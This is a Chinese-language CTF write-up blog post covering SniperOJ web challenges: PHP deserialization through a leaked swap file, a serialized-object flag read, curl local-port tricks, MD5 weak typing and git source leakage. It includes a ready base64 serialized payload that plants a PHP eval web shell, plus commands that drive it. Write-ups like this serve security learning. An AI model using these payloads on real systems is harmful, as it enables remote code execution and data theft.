---
title: sniperoj some web writeup
date: 2017-11-07 15:54:41
tags: [sniperoj,web,ctf,记录]
categories:
---

## 0x00.前言

今天机缘巧合发现了这个OJ平台，http://www.sniperoj.com/, 就随手做一下，平台十分小清新，web题目还行，有一点收获，记录一下而已。

## 0x01.记录

### 1.php-object-injection

提示是一个反序列化题目，像这种什么都没给的，右键源码什么都木有的，不用说，一定是源码泄露了。swp，bak,~都给上去看看有木有。最后是 http://120.24.215.80:10007/.index.php.swp

在ubuntu中复原一下 vim -r index.php.swp 得:

```php
   class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
```

<!-- more -->

代码很长，给出上面两处就明白了

```php+HTML
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

_construct()是构造函数，在用对象前做一些微小得工作。这里可以直接反序列化创造文件。构造得:

 ![13](http://myndtt.github.io/images/13.png)



```
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL215bmQucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6MjU6Ijw%2FcGhwIGV2YWwoJF9QT1NUWydhJ10pPz4iO30%3D
```

burp抓包修改drawing为上述值

http://120.24.215.80:10007/img/mynd.php   依次post如下数据即可

```
a=print_r(scandir("../"));
a=print_r(file_get_contents("../F_LLLLA_-gggg"));
```

### 2.guess the code

这道题跟上面是一个道理，都很简单，右键源码拉最后发现

```php
<p hidden>#try to read flag.php	
Class whatthefuck{
	public function __toString()
	{
		return highlight_file($this->source,true);
	}
}</p>
</form>
</body>
</html>
```

这个代码要我们取推测，很显然这个this->source变量source是关键，构造得:

![14](http://myndtt.github.io/images/14.png)

```
O:11:"whatthefuck":1:{s:6:"source";s:8:"flag.php";}
a%3A1%3A%7Bi%3A0%3BO%3A11%3A%22whatthefuck%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
#第一个是原始的
```

最后问题来了，那要通过什么值取上传这个东西呢，Burp抓包看看就知道十有八九是这个list了。

### 3.SniperOJ-Web-Browser

这个题比较有意思，开始以为会很水，最后那个要指定特定端口的还是很有意思，以前见过这类题writeup，用的好像是curl，重新翻了翻curl手册，看看有什么命令可以修改端口，果然，哈哈。只不过是要公网的

```
  --local-port 	强制使用本地端口号 
```

![15](http://myndtt.github.io/images/15.png)

### 4.php-weak-type

http://120.24.215.80:10001/index.php~  查看到源码，MD5,弱类型

其他题目暂时连不上

## 0x02.学习

### 1.2048 GAME

这道题算是最有意思的了，因为没做出来哈哈。

题目提示是git源码泄露，并且给了工具，但我以往用的工具不是给的这个。用的是这位大佬的

https://github.com/lijiejie/GitHack

下下来源码以后，发现没什么用啊，都是JS,CSS，这些都可以右键源码跟进找到有什么用呢？

后来网上搜，翻看这个平台作者的简书http://www.jianshu.com/p/e9923b65789e

这让我不禁又会看起GIT教程了,还是廖大佬讲的清楚

https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000

其实就是当用题目给的那个工具还可以抓下.GIT，而flag就藏在以前的某个GIT版本里面，回退去就好了。

## 0x03.学无止境

最近发现了好几个平台，看见有意思的再写写吧

